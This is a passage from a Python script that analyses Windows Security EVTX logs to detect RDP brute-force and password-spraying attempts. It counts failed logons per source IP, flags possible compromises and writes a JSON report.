            FAILURE_SUBSTATUS.get(e["sub_status"], e["sub_status"])
            for e in self.failed_logons
        )

        brute_force_ips = {ip: cnt for ip, cnt in ip_counter.items()
                          if cnt >= self.threshold and ip != "-"}

        success_ips = {e["source_ip"] for e in self.successful_logons}
        compromised = []
        for ip in brute_force_ips:
            if ip in success_ips:
                user_list = [e["target_user"] for e in self.successful_logons
                             if e["source_ip"] == ip]
                compromised.append({"ip": ip, "users": list(set(user_list)),
                                    "failed_attempts": brute_force_ips[ip]})

        users_per_ip = defaultdict(set)
        for e in self.failed_logons:
            users_per_ip[e["source_ip"]].add(e["target_user"])
        spray_ips = {ip: len(users) for ip, users in users_per_ip.items()
                     if len(users) >= 5}

        return {
            "total_failed_logons": len(self.failed_logons),
            "total_successful_logons": len(self.successful_logons),
            "unique_source_ips": len(ip_counter),
            "top_attacking_ips": ip_counter.most_common(20),
            "targeted_users": user_counter.most_common(20),
            "failure_reasons": dict(substatus_counter),
            "brute_force_ips": brute_force_ips,
            "password_spray_ips": spray_ips,
            "potential_compromises": compromised,
        }

    def generate_report(self):
        """Parse events and generate full detection report."""
        self.parse_events()
        analysis = self.analyze()

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "evtx_file": str(self.evtx_path),
            "detection_threshold": self.threshold,
            **analysis,
        }
        out = self.output_dir / "rdp_brute_force_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(json.dumps(report, indent=2, default=str))
        return report


def main():
    parser = argparse.ArgumentParser(
        description="Detect RDP brute force attacks from Windows Security EVTX logs"
    )
    parser.add_argument("evtx_file", help="Path to Security.evtx log file")
    parser.add_argument("--threshold", type=int, default=10,
                        help="Min failed logons per IP to flag as brute force (default: 10)")
    parser.add_argument("--output-dir", default="./rdp_brute_force_report",
                        help="Output directory for report")
    args = parser.parse_args()

    os.makedirs(args.output_dir, exist_ok=True)
    detector = RDPBruteForceDetector(args.evtx_file, args.threshold,
                                     output_dir=args.output_dir)
    detector.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====
